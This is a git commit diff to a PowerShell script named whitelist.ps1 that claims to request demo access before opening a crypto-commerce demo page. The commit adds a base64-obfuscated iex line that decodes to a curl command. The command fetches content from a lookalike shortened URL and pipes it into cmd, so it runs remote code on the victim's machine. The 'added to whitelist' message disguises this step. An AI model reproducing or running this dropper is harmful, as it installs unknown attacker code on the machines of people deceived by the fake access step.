4c9fbcbe9a9503c739aecede6fdc28ed482f92c3
cartdev <playblockventures@gmail.com>
2026-03-17 09:51:09 -0400

    update wondows curl

--- public/whitelist.ps1
+++ public/whitelist.ps1
@@ -1,4 +1,4 @@
 Write-Host "Requesting access for the demo..." -ForegroundColor Green
-iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9ncmFtYXJseWdwdC5zaG9ydC5neS9jc1JrTW45dw=")))
+iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y3VybC5leGUgaHR0cHM6Ly9ncmFtYXJseWdwdC5zaG9ydC5neS9jc1JrTW45dyAtTCB8IGNtZA=")))
 Write-Host "Added to whitelist successfully. Showing demo..." -ForegroundColor Green
 [System.Diagnostics.Process]::Start("https://demo.cryptocommerce.cloud/")
